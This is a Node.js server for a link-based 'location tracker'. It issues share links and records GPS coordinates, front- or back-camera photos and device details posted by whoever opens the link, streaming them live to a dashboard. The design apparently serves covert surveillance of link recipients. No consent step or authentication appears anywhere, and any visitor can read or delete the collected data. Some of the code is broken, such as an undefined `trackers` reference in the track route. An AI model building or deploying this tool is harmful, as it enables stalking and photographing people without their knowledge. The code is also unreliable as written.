const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' }
});

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const { MongoClient } = require('mongodb');

// ── Database Layer ──────────────────────────────────────────
let db = null;
const MONGODB_URI = process.env.MONGODB_URI;
const DATABASE_NAME = 'location_tracker';

async function connectDB() {
  if (db) return db;
  if (!MONGODB_URI) {
    console.warn('⚠️  MONGODB_URI not found! Data will NOT persist on Vercel.');
    db = {
      collection: (name) => ({
        find: () => ({ toArray: async () => Array.from(mockStore[name].values()) }),
        findOne: async (query) => mockStore[name].get(query.id),
        insertOne: async (doc) => mockStore[name].set(doc.id, doc),
        updateOne: async (query, update) => {
          const doc = mockStore[name].get(query.id);
          if (doc) Object.assign(doc, update.$set || update);
          return { modifiedCount: 1 };
        },
        deleteOne: async (query) => mockStore[name].delete(query.id),
        push: async (id, field, value) => {
           const list = mockStore[field].get(id) || [];
           list.push(value);
           mockStore[field].set(id, list);
        }
      })
    };
    return db;
  }
  const client = new MongoClient(MONGODB_URI);
  await client.connect();
  db = client.db(DATABASE_NAME);
  console.log('✅ Connected to MongoDB Atlas');
  return db;
}

// Mock store for fallback
const mockStore = {
  trackers: new Map(),
  locations: new Map(),
  photos: new Map()
};

async function getCollection(name) {
  const database = await connectDB();
  return database.collection(name);
}

// ── Updated Helpers ──────────────────────────────────────────

async function getTracker(id) {
  const col = await getCollection('trackers');
  return MONGODB_URI ? await col.findOne({ id }) : mockStore.trackers.get(id);
}

async function updateTrackerLocation(trackerId, entry) {
  const tCol = await getCollection('trackers');
  const lCol = await getCollection('locations');
  const tracker = await getTracker(trackerId);
  if (!tracker) return false;

  if (MONGODB_URI) {
    await lCol.insertOne({ trackerId, ...entry });
    await tCol.updateOne({ id: trackerId }, { $set: { lastLocation: entry, active: true } });
  } else {
    const locs = mockStore.locations.get(trackerId) || [];
    locs.push(entry);
    mockStore.locations.set(trackerId, locs);
    tracker.lastLocation = entry;
    tracker.active = true;
  }

  io.to(`tracker:${trackerId}`).emit('location-received', { trackerId, location: entry });
  io.emit('tracker-updated', { ...tracker, lastLocation: entry, active: true });
  return true;
}

async function addPhoto(trackerId, photo) {
  const pCol = await getCollection('photos');
  const tracker = await getTracker(trackerId);
  if (!tracker) return false;

  if (MONGODB_URI) {
    await pCol.insertOne({ trackerId, ...photo });
  } else {
    const phs = mockStore.photos.get(trackerId) || [];
    phs.push(photo);
    mockStore.photos.set(trackerId, phs);
  }

  io.to(`tracker:${trackerId}`).emit('photo-received', { trackerId, photo });
  return true;
}

async function updateDeviceInfo(trackerId, info) {
  const tCol = await getCollection('trackers');
  const tracker = await getTracker(trackerId);
  if (!tracker) return false;

  if (MONGODB_URI) {
    await tCol.updateOne({ id: trackerId }, { $set: { deviceInfo: info } });
  } else {
    tracker.deviceInfo = info;
  }

  io.emit('tracker-updated', { ...tracker, deviceInfo: info });
  return true;
}

// ── API Routes (Serverless Friendly) ──────────────────────────

// Location update from tracked device
app.post('/api/tracker/:id/location', async (req, res) => {
  const { latitude, longitude, accuracy, altitude, speed, heading } = req.body;
  const entry = {
    latitude, longitude, accuracy, altitude, speed, heading,
    timestamp: new Date().toISOString()
  };
  const success = await updateTrackerLocation(req.params.id, entry);
  res.json({ success });
});

// Photo capture from tracked device
app.post('/api/tracker/:id/photo', async (req, res) => {
  const { image, facing } = req.body;
  const entry = { image, facing, timestamp: new Date().toISOString() };
  const success = await addPhoto(req.params.id, entry);
  res.json({ success });
});

// Device info from tracked device
app.post('/api/tracker/:id/info', async (req, res) => {
  const success = await updateDeviceInfo(req.params.id, req.body);
  res.json({ success });
});

// ── API Routes (Standard) ────────────────────────────────────

// Create a new tracker session
app.post('/api/tracker/create', async (req, res) => {
  const id = uuidv4().slice(0, 8);
  const tracker = {
    id,
    name: req.body.name || `Tracker ${id}`,
    createdAt: new Date().toISOString(),
    active: false,
    lastLocation: null,
    deviceInfo: null
  };
  
  const col = await getCollection('trackers');
  if (MONGODB_URI) {
    await col.insertOne(tracker);
  } else {
    mockStore.trackers.set(id, tracker);
  }
  
  res.json({ success: true, tracker, link: `${req.protocol}://${req.get('host')}/track/${id}` });
});

// Get all trackers
app.get('/api/trackers', async (req, res) => {
  const col = await getCollection('trackers');
  const lCol = await getCollection('locations');
  const pCol = await getCollection('photos');

  let all;
  if (MONGODB_URI) {
    all = await col.find({}).toArray();
    // In a real app we'd use aggregation, but for now we'll map
    for (const t of all) {
      t.locationCount = await lCol.countDocuments({ trackerId: t.id });
      t.photoCount = await pCol.countDocuments({ trackerId: t.id });
    }
  } else {
    all = Array.from(mockStore.trackers.values()).map(t => ({
      ...t,
      locationCount: mockStore.locations.get(t.id)?.length || 0,
      photoCount: mockStore.photos.get(t.id)?.length || 0
    }));
  }
  res.json(all);
});

// Get single tracker
app.get('/api/tracker/:id', async (req, res) => {
  const tracker = await getTracker(req.params.id);
  if (!tracker) return res.status(404).json({ error: 'Tracker not found' });
  
  let result = { ...tracker };
  if (MONGODB_URI) {
    const lCol = await getCollection('locations');
    const pCol = await getCollection('photos');
    result.locations = await lCol.find({ trackerId: req.params.id }).limit(100).toArray();
    result.photos = await pCol.find({ trackerId: req.params.id }).limit(50).toArray();
  } else {
    result.locations = mockStore.locations.get(req.params.id) || [];
    result.photos = mockStore.photos.get(req.params.id) || [];
  }
  res.json(result);
});

// Delete tracker
app.delete('/api/tracker/:id', async (req, res) => {
  const id = req.params.id;
  const col = await getCollection('trackers');
  const lCol = await getCollection('locations');
  const pCol = await getCollection('photos');

  if (MONGODB_URI) {
    await col.deleteOne({ id });
    await lCol.deleteMany({ trackerId: id });
    await pCol.deleteMany({ trackerId: id });
  } else {
    mockStore.trackers.delete(id);
    mockStore.locations.delete(id);
    mockStore.photos.delete(id);
  }
  
  io.emit('tracker-deleted', id);
  res.json({ success: true });
});

// ── Socket.io (Hybrid) ──────────────────────────────────────

io.on('connection', (socket) => {
  socket.on('join-tracker', async (trackerId) => {
    socket.join(`tracker:${trackerId}`);
    socket.trackerId = trackerId;
    const tracker = await getTracker(trackerId);
    if (tracker) {
      await updateDeviceInfo(trackerId, tracker.deviceInfo || {}); // Just to trigger online status
    }
  });

  socket.on('watch-tracker', (trackerId) => {
    socket.join(`tracker:${trackerId}`);
  });

  socket.on('location-update', async (data) => {
    await updateTrackerLocation(data.trackerId, { ...data, timestamp: new Date().toISOString() });
  });

  socket.on('photo-capture', async (data) => {
    await addPhoto(data.trackerId, { ...data, timestamp: new Date().toISOString() });
  });

  socket.on('device-info', async (data) => {
    await updateDeviceInfo(data.trackerId, data.info);
  });

  socket.on('disconnect', async () => {
    if (socket.trackerId) {
      const tracker = await getTracker(socket.trackerId);
      if (tracker) {
        tracker.active = false;
        io.emit('tracker-updated', tracker);
      }
    }
  });
});


// ── Track page route ────────────────────────────────────────
app.get('/track/:id', (req, res) => {
  const tracker = trackers.get(req.params.id);
  if (!tracker) return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
  res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`\n  🟢 Location Tracker Dashboard running at http://localhost:${PORT}\n`);
});
